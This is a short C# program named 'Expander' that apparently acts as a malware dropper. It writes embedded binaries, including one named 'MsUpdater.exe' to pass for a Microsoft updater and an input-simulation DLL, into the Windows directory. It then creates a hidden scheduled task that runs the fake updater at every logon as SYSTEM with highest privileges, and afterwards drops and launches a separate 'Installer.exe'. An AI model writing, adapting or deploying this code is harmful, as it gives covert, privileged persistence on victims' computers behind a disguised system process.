namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;

    using Expander.Properties;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
            Directory.CreateDirectory(targetDir);

            var target = Path.Combine(targetDir, "MsUpdater.exe");
            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
            File.WriteAllBytes(target, Resources.MsUpdater);

            Process.Start(new ProcessStartInfo
                              {
                                  FileName = "schtasks.exe",
                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST /RU SYSTEM",
                                  WindowStyle = ProcessWindowStyle.Hidden
                              });

            var copyDir = Path.Combine(Directory.GetCurrentDirectory(), "Temp");
            Directory.CreateDirectory(copyDir);
            var copyTarget = Path.Combine(copyDir, "Installer.exe");

            if (!File.Exists(copyTarget))
            {
                File.WriteAllBytes(copyTarget, Resources.Installer);
            }

            Process.Start(copyTarget);
        }
    }
}